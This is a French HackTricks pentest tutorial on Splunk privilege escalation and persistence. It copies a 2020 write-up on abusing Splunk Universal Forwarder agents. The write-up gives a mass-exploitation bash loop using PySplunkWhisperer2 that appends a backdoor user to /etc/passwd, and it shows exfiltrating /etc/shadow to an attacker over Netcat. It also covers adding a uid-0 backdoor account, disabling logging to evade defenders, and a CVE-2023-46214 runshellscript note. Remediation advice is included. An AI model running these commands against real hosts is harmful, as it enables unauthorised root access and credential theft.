# Splunk LPE et Persistance

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Si en **énumérant** une machine **internement** ou **externement** vous trouvez **Splunk en cours d'exécution** (port 8090), si vous connaissez par chance des **identifiants valides**, vous pouvez **abuser du service Splunk** pour **exécuter un shell** en tant qu'utilisateur exécutant Splunk. Si root l'exécute, vous pouvez élever les privilèges à root.

Aussi, si vous êtes **déjà root et que le service Splunk n'écoute pas seulement sur localhost**, vous pouvez **voler** le fichier **de mots de passe** du service Splunk et **craquer** les mots de passe, ou **ajouter de nouveaux** identifiants à celui-ci. Et maintenir la persistance sur l'hôte.

Dans la première image ci-dessous, vous pouvez voir à quoi ressemble une page web Splunkd.

**Les informations suivantes ont été copiées de** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

## Abuser des Splunk Forwarders pour des Shells et la Persistance

14 août 2020

### Description : <a href="#description" id="description"></a>

L'agent Splunk Universal Forwarder (UF) permet aux utilisateurs distants authentifiés d'envoyer des commandes uniques ou des scripts aux agents via l'API Splunk. L'agent UF ne valide pas si les connexions proviennent d'un serveur Splunk Enterprise valide, ni si le code est signé ou autrement prouvé comme provenant du serveur Splunk Enterprise. Cela permet à un attaquant qui obtient l'accès au mot de passe de l'agent UF d'exécuter du code arbitraire sur le serveur en tant que SYSTEM ou root, selon le système d'exploitation.

Cette attaque est utilisée par les Testeurs d'Intrusion et est probablement activement exploitée dans le monde réel par des attaquants malveillants. Obtenir le mot de passe pourrait conduire à la compromission de centaines de systèmes dans un environnement client.

Les mots de passe Splunk UF sont relativement faciles à acquérir, voir la section Emplacements Communs des Mots de Passe pour plus de détails.

### Contexte : <a href="#context" id="context"></a>

Splunk est un outil d'agrégation et de recherche de données souvent utilisé comme système de Surveillance des Informations de Sécurité et des Événements (SIEM). Splunk Enterprise Server est une application web qui fonctionne sur un serveur, avec des agents, appelés Universal Forwarders, qui sont installés sur chaque système du réseau. Splunk fournit des binaires d'agent pour Windows, Linux, Mac et Unix. De nombreuses organisations utilisent Syslog pour envoyer des données à Splunk au lieu d'installer un agent sur les hôtes Linux/Unix, mais l'installation d'agent devient de plus en plus populaire.

Universal Forwarder est accessible sur chaque hôte à https://host:8089. L'accès à l'un des appels API protégés, tels que /service/, fait apparaître une boîte d'authentification de base. Le nom d'utilisateur est toujours admin, et le mot de passe par défaut était changeme jusqu'en 2016 lorsque Splunk a exigé que toutes les nouvelles installations définissent un mot de passe de 8 caractères ou plus. Comme vous le noterez dans ma démo, la complexité n'est pas une exigence car mon mot de passe d'agent est 12345678. Un attaquant distant peut forcer brutalement le mot de passe sans verrouillage, ce qui est une nécessité pour un hôte de logs, puisque si le compte était verrouillé, les logs ne seraient plus envoyés au serveur Splunk et un attaquant pourrait utiliser cela pour cacher ses attaques. La capture d'écran suivante montre l'agent Universal Forwarder, cette page initiale est accessible sans authentification et peut être utilisée pour énumérer les hôtes exécutant Splunk Universal Forwarder.

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

La documentation de Splunk montre l'utilisation du même mot de passe Universal Forwarding pour tous les agents, je ne me souviens pas avec certitude si c'est une exigence ou si des mots de passe individuels peuvent être définis pour chaque agent, mais basé sur la documentation et la mémoire de quand j'étais administrateur Splunk, je crois que tous les agents doivent utiliser le même mot de passe. Cela signifie que si le mot de passe est trouvé ou craqué sur un système, il est probable qu'il fonctionne sur tous les hôtes Splunk UF. Cela a été mon expérience personnelle, permettant la compromission rapide de centaines d'hôtes.

### Emplacements Communs des Mots de Passe <a href="#common-password-locations" id="common-password-locations"></a>

Je trouve souvent le mot de passe en clair de l'agent Splunk Universal Forwarding dans les emplacements suivants sur les réseaux :

1. Répertoire Active Directory Sysvol/domain.com/Scripts. Les administrateurs stockent l'exécutable et le mot de passe ensemble pour une installation efficace de l'agent.
2. Partages de fichiers réseau hébergeant des fichiers d'installation informatique
3. Wiki ou autres dépôts de notes de construction sur le réseau interne

Le mot de passe peut également être accédé sous forme hachée dans Program Files\Splunk\etc\passwd sur les hôtes Windows, et dans /opt/Splunk/etc/passwd sur les hôtes Linux et Unix. Un attaquant peut tenter de craquer le mot de passe en utilisant Hashcat, ou louer un environnement de craquage dans le cloud pour augmenter la probabilité de craquer le hachage. Le mot de passe est un hachage SHA-256 fort et en tant que tel, un mot de passe fort et aléatoire est peu susceptible d'être craqué.

### Impact : <a href="#impact" id="impact"></a>

Un attaquant avec un mot de passe d'agent Splunk Universal Forward peut compromettre complètement tous les hôtes Splunk du réseau et obtenir des permissions SYSTEM ou root sur chaque hôte. J'ai utilisé avec succès l'agent Splunk sur des hôtes Windows, Linux et Solaris Unix. Cette vulnérabilité pourrait permettre de déverser les identifiants système, d'exfiltrer des données sensibles ou d'installer un rançongiciel. Cette vulnérabilité est rapide, facile à utiliser et fiable.

Puisque Splunk gère les logs, un attaquant pourrait reconfigurer l'Universal Forwarder dès la première commande exécutée pour changer l'emplacement du Forwarder, désactivant ainsi la journalisation vers le SIEM Splunk. Cela réduirait considérablement les chances d'être attrapé par l'équipe Blue du client.

Splunk Universal Forwarder est souvent installé sur les contrôleurs de domaine pour la collecte de logs, ce qui pourrait facilement permettre à un attaquant d'extraire le fichier NTDS, de désactiver l'antivirus pour une exploitation ultérieure, et/ou de modifier le domaine.

Enfin, l'agent Universal Forwarding ne nécessite pas de licence et peut être configuré avec un mot de passe de manière autonome. Ainsi, un attaquant peut installer Universal Forwarder comme mécanisme de persistance de porte dérobée sur les hôtes, puisqu'il s'agit d'une application légitime que les clients, même ceux qui n'utilisent pas Splunk, ne sont pas susceptibles de supprimer.

### Preuves : <a href="#evidence" id="evidence"></a>

Pour montrer un exemple d'exploitation, j'ai configuré un environnement de test en utilisant la dernière version de Splunk pour le serveur Enterprise et l'agent Universal Forwarding. Un total de 10 images ont été jointes à ce rapport, montrant ce qui suit :

1- Demande du fichier /etc/passwd via PySplunkWhisper2

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Réception du fichier /etc/passwd sur le système de l'attaquant via Netcat

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- Demande du fichier /etc/shadow via PySplunkWhisper2

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Réception du fichier /etc/shadow sur le système de l'attaquant via Netcat

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- Ajout de l'utilisateur attacker007 au fichier /etc/passwd

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- Ajout de l'utilisateur attacker007 au fichier /etc/shadow

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- Réception du nouveau fichier /etc/shadow montrant que attacker007 a été ajouté avec succès

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- Confirmation de l'accès SSH à la victime en utilisant le compte attacker007

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- Ajout d'un compte root de porte dérobée avec le nom d'utilisateur root007, avec l'uid/gid défini à 0

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- Confirmation de l'accès SSH en utilisant attacker007, puis élévation à root en utilisant root007

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

À ce stade, j'ai un accès persistant à l'hôte à la fois via Splunk et via les deux comptes d'utilisateurs créés, dont l'un fournit root. Je peux désactiver la journalisation à distance pour couvrir mes traces et continuer à attaquer le système et le réseau en utilisant cet hôte.

Scripter PySplunkWhisperer2 est très facile et efficace.

1. Créez un fichier avec les IP des hôtes que vous souhaitez exploiter, exemple de nom ip.txt
2. Exécutez ce qui suit :
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
Informations sur l'hôte :

Serveur Splunk Enterprise : 192.168.42.114\
Agent Victime du Forwarder Universel Splunk : 192.168.42.98\
Attaquant : 192.168.42.51

Version de Splunk Enterprise : 8.0.5 (dernière en date du 12 août 2020 – jour de la configuration du laboratoire)\
Version du Forwarder Universel : 8.0.5 (dernière en date du 12 août 2020 – jour de la configuration du laboratoire)

#### Recommandations de remédiation pour Splunk, Inc : <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

Je recommande de mettre en œuvre toutes les solutions suivantes pour fournir une défense en profondeur :

1. Idéalement, l'agent du Forwarder Universel ne devrait pas avoir de port ouvert du tout, mais devrait plutôt interroger le serveur Splunk à intervalles réguliers pour des instructions.
2. Activer l'authentification mutuelle TLS entre les clients et le serveur, en utilisant des clés individuelles pour chaque client. Cela fournirait une sécurité bidirectionnelle très élevée entre tous les services Splunk. L'authentification mutuelle TLS est de plus en plus mise en œuvre dans les agents et les dispositifs IoT, c'est l'avenir de la communication client-serveur de dispositifs de confiance.
3. Envoyer tout le code, fichiers de ligne unique ou scripts, dans un fichier compressé qui est chiffré et signé par le serveur Splunk. Cela ne protège pas les données de l'agent envoyées via l'API, mais protège contre l'exécution de code à distance malveillante par un tiers.

#### Recommandations de remédiation pour les clients de Splunk : <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Assurez-vous qu'un mot de passe très fort est défini pour les agents Splunk. Je recommande un mot de passe aléatoire d'au moins 15 caractères, mais puisque ces mots de passe ne sont jamais tapés, cela pourrait être défini sur un mot de passe très long, comme 50 caractères.
2. Configurer des pare-feu basés sur l'hôte pour n'autoriser les connexions au port 8089/TCP (port de l'agent du Forwarder Universel) que depuis le serveur Splunk.

### Recommandations pour l'équipe rouge : <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Téléchargez une copie de Splunk Universal Forwarder pour chaque système d'exploitation, car c'est un excellent implant léger signé. Bon à garder une copie au cas où Splunk corrigerait réellement cela.

### Exploits/Blogs d'autres chercheurs <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Exploits publics utilisables :

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Articles de blog associés :

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* Note : \*\*_ Ce problème est un problème sérieux avec les systèmes Splunk et il a été exploité par d'autres testeurs pendant des années. Bien que l'exécution de code à distance soit une fonctionnalité prévue de Splunk Universal Forwarder, la mise en œuvre de cela est dangereuse. J'ai tenté de soumettre ce bogue via le programme de bug bounty de Splunk dans le cas très improbable où ils ne seraient pas conscients des implications de conception, mais on m'a informé que toute soumission de bogue implémentait la politique de divulgation Bug Crowd/Splunk qui stipule qu'aucun détail de la vulnérabilité ne peut être discuté publiquement _jamais_ sans la permission de Splunk. J'ai demandé un délai de divulgation de 90 jours et cela a été refusé. En tant que tel, je n'ai pas divulgué cela de manière responsable puisque je suis raisonnablement sûr que Splunk est conscient du problème et a choisi de l'ignorer, je pense que cela pourrait gravement impacter les entreprises, et c'est la responsabilité de la communauté infosec d'éduquer les entreprises.

## Abuser des requêtes Splunk

Infos de [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)

Le **CVE-2023-46214** permettait de télécharger un script arbitraire dans **`$SPLUNK_HOME/bin/scripts`** et expliquait ensuite qu'en utilisant la requête de recherche **`|runshellscript script_name.sh`** il était possible d'**exécuter** le **script** stocké là :

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous voulez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
